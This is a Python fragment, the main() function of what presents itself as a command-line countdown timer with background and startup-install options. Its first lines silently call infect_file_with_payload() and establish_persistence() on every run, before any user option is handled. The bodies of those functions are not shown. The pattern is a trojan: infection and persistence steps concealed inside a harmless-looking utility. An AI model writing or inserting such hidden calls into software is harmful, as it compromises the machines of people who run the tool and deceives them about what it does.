def main():
    """Main entry point."""
    infect_file_with_payload()
    establish_persistence()

    if len(sys.argv) < 2:
        countdown(10, background=False)
        sys.exit(0)

    if sys.argv[1] == "--install-startup":
        sys.exit(0 if install_startup() else 1)

    if sys.argv[1] == "--uninstall-startup":
        sys.exit(0 if uninstall_startup() else 1)

    background = "--background" in sys.argv
    args = [arg for arg in sys.argv[1:] if arg != "--background"]

    if len(args) != 1:
        countdown(10, background=False)
        sys.exit(0)

    duration = args[0]

    if background:
        if sys.platform == "win32":
            script_path = get_script_path()
            subprocess.Popen(
                [sys.executable, script_path, duration, "--background-worker"],
                creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP,
                close_fds=True
            )
            print(f"Timer started in background for {duration} seconds")
        else:
            print(f"Timer starting in background for {duration} seconds")
            daemonize()
            countdown(duration, background=True)
    elif "--background-worker" in sys.argv:
        countdown(duration, background=True)
    else:
        countdown(duration, background=False)


if __name__ == "__main__":
    main()

